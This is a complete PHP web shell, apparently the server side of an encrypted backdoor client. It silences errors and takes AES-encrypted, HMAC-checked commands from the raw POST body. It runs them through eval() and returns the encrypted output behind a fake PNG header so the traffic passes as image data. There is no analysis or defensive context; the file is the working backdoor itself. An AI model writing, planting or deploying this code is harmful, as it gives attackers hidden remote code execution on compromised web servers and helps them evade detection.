<?php
@error_reporting(0);

$key = "__KEY__"; 

$raw = array_values(unpack('C*', $key));
$rawLen = count($raw);
$aesKeyBytes = [];
$ivBytes = [];

for ($i = 0; $i < 16; $i++) {
    $aesKeyBytes[] = ($raw[$i % $rawLen] ^ 0x1F);
    $ivBytes[]     = ($raw[$i % $rawLen] ^ 0x2E);
}
$aesKey = pack('C*', ...$aesKeyBytes);
$defaultIv = pack('C*', ...$ivBytes); 

$data = file_get_contents("php://input");

if (!empty($data) && strlen($data) > 68) {
    try {
        $decrypted = decryptData($data, $aesKey);
        
        $arr = explode('|', $decrypted);
        $func = $arr[0];
        $params = $arr[1];
        
        ob_start();
        class C { public function __invoke($p) { eval($p . ""); } }
        @call_user_func(new C(), $params);
        $output = ob_get_clean();
        
        echo encryptData($output, $aesKey, $defaultIv);
        
    } catch (Exception $e) {
        exit();
    }
}

function decryptData($data, $aesKey) {
    $prefixLen = 68;
    $encrypted = substr($data, $prefixLen);
    $encLen = strlen($encrypted);
    
    if ($encLen < 48) {
        throw new Exception("data too short");
    }
    
    $iv = substr($encrypted, 0, 16);
    $tag = substr($encrypted, -32);
    $body = substr($encrypted, 16, $encLen - 48);
    
    $macData = $iv . $body;
    $check = hash_hmac('sha256', $macData, $aesKey, true);
    
    if (!hash_equals($check, $tag)) {
        throw new Exception("bad mac");
    }
    
    $decrypted = openssl_decrypt($body, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $iv);
    if ($decrypted === false) {
        throw new Exception("decrypt failed");
    }
    
    return $decrypted;
}

function encryptData($data, $aesKey, $defaultIv) {
    $prefix = base64_decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=");
    $iv = $defaultIv; 
    
    $enc = openssl_encrypt($data, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $iv);
    $out = $iv . $enc;
    $tag = hash_hmac('sha256', $out, $aesKey, true);
    
    return $prefix . $out . $tag;
}
?>
